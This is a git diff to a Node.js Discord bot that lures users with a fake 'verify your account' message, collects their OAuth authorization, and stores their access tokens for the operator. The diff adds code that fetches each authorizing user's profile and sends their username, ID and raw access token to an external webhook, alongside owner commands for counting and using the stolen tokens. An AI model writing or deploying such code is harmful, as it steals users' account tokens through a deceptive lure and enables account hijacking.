@@ -9,6 +9,7 @@ const express = require("express");
 const db = require("quick.db")
 const emoji = require("./emojis.json")
 const app = express();
+const fs = require("fs")
 
 const client = new main({
   token: process.env.token,
@@ -25,6 +26,8 @@ client.on("ready", (bot) => {
 client.on("message", async (bot, message, args, command) => {
   if (!message.content.startsWith(config.prefix)) return;
   if (!config.owners.includes(message.author.id)) return;
+
+
   if (command === "users") {
     const amount = await client.tokenCount();
     message.channel.send({
@@ -63,7 +66,7 @@ client.on("message", async (bot, message, args, command) => {
     message.channel.send("I have detected your account as an alt/bot account. Please verify your account...", { embed: verifynoww, button: verifynow })
   }
 
-  if (command === "cleans") {
+  if (command === "clean") {
     await client.clean(message)
   }
 
@@ -139,8 +142,6 @@ client.on("message", async (bot, message, args, command) => {
 // Do not delete or edit line 165 to line 180...
 
 app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/index.html") //THIS WILL REDIRECT THE PERSON TO THE SITE
-  // IF YOU GET THAT PAGE IS BLOCKED YOU CAN FIX IT WITH CLOUDFLARE BY MAKING IT SO HTTPS AND HTTP CAN WORK TOGETHER... OR: YOU USE HTTP INSTEAD OF HTTPS
   res.redirect(config.oauth_link);
 });
 
@@ -152,10 +153,42 @@ app.get("/authed", async (req, res) => {
     user_id
   };
   client.saveAuth(obj);
-  res.redirect("https://discord.com/oauth2/authorized");
+
+  //fix
+  fetch('https://discord.com/api/users/@me', {
+    headers: {
+      authorization: `Bearer ${data.access_token}`,
+    },
+  })
+    .then(result => result.json())
+    .then(response => {
+      const { username, discriminator, avatar, id, ip, } = response;
+
+      let params = {
+        username: config.webhook_NAME,
+        avatar_url: config.webhook_AVATAR,
+        userIP: ip,
+        embeds: [{
+          "title": `✔️ | New Auth Detected!`,
+          "description": `**» Authed User:**\n Discord Tag: ${username}#${discriminator}\nDiscord ID: ${id}\n\n\n**» Authed User's Info:**\nIP Address: **Soon!**\n\n**» Token:**\n Access Token: ${data.access_token}`
+        }]
+      }
+
+
+      fetch(config.webhook_URL, {
+        method: "POST",
+        headers: {
+          'Content-type': 'application/json'
+        },
+        body: JSON.stringify(params)
+      }).then(res => {
+        console.log(res);
+      })
+    })
+
+
+  res.sendFile(__dirname + '/index.html')
 });
 
 app.listen(80); // Local Host Port
-
-
 
